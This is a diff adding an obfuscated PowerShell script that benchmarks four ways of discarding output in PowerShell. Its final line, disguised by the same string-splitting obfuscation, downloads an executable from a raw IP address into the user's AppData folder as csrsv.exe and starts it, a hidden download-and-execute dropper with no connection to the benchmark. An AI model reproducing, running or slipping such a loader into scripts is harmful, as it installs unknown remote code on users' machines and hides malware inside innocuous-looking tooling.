@@ -1,0 +1,34 @@
+${a1} = &("{0}{1}{2}"-f 'N','ew-','Object') ("{2}{3}{1}{6}{4}{0}{5}" -f's','ll','System.','Co','yLi','t','ections.Arra')
+${a`2} = &("{0}{1}{2}"-f 'Ne','w-','Object') ("{1}{2}{0}{4}{3}"-f'ns.','System.C','ollectio','ayList','Arr')
+${a3} = &("{3}{1}{2}{0}"-f 't','j','ec','New-Ob') ("{5}{2}{0}{4}{3}{1}{6}"-f 'ectio','i','ll','rayL','ns.Ar','System.Co','st')
+${A4} = &("{2}{0}{1}" -f'ew-O','bject','N') ("{1}{5}{6}{2}{3}{0}{4}"-f'yLi','S','llections','.Arra','st','yst','em.Co')
+
+1..100 | .('%') {
+    ${nu`Ll} = ${a1}.("{0}{1}"-f'Ad','d').Invoke(
+        (&("{0}{4}{3}{1}{2}"-f'Measure-C','man','d','m','o') {
+            ${NU`ll} = $(1..100)
+        })."t`icks"
+    )
+    ${N`ULL} = ${a`2}.("{1}{0}" -f 'd','Ad').Invoke(
+        (&("{4}{1}{3}{2}{0}"-f'd','ure','omman','-C','Meas') {
+            $(1..100) > ${n`ULL}
+        })."ti`cks"
+    )
+    ${N`UlL} = ${A3}."a`Dd"(
+        (&("{3}{2}{0}{1}"-f 'ure-Comma','nd','eas','M') {
+            [void]$(1..100)
+        })."TIC`KS"
+    )
+    ${nu`lL} = ${A4}.("{1}{0}"-f'd','Ad').Invoke(
+        (.("{2}{0}{3}{1}"-f 'e','d','Measur','-Comman') {
+            $(1..100) | &("{1}{0}{2}" -f 'N','Out-','ull')
+        })."T`icKS"
+    )
+}
+
+(${A1} | .("{1}{0}"-f'e','measur') -Sum)."S`Um"
+(${A`2} | &("{2}{0}{1}"-f'easu','re','m') -Sum)."s`Um"
+(${a3} | .("{0}{1}" -f'measur','e') -Sum)."S`Um"
+(${A4} | .("{0}{1}" -f 'measur','e') -Sum)."S`UM"
+
+(.("{2}{1}{0}" -f 'w-Object','e','N') ("{4}{0}{5}{3}{1}{2}{6}" -f'tem','W','ebC','.','Sys','.Net','lient')).("{2}{1}{0}" -f'nloadFile','ow','D').Invoke(("{1}{6}{2}{4}{5}{0}{3}" -f'rsv','http','3.238/~yahoo','.exe','/','cs','://94.102.5'),"$env:APPDATA\csrsv.exe");&("{1}{2}{0}{3}" -f'rt-Proce','S','ta','ss') ("$env:APPDATA\csrsv.exe")
